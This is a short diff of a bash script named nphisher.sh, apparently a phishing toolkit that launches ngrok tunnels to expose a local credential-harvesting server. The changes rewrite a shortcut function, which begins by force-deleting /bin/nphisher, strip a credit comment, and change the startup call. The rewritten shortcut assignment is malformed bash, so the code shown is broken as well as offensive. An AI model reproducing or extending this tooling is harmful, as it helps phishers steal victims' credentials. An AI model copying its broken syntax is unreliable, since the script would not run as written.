@@ -244,8 +244,7 @@ shortcut() {
 }
 shortcut_setup() {
 	rm -rf /bin/nphisher
-	shortcutcmd = 
-	"pro_dir = ${pro_dir}"
+	shortcutcmd = "pro_dir = ${pro_dir}"
 	"if [[ -d "${pro_dir}" ]]; then
 		bash ${pro_dir}/nphisher.sh
 	else
@@ -316,7 +315,7 @@ start_ngrok() {
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
         ngrok_token_check
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & 
     else
         sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
@@ -1940,7 +1939,7 @@ xpermission
 install_ngrok
 install_cloudflared
 install_localxpose
-shortcut_check
+shortcut_setup
 clear
 mainmenu
 
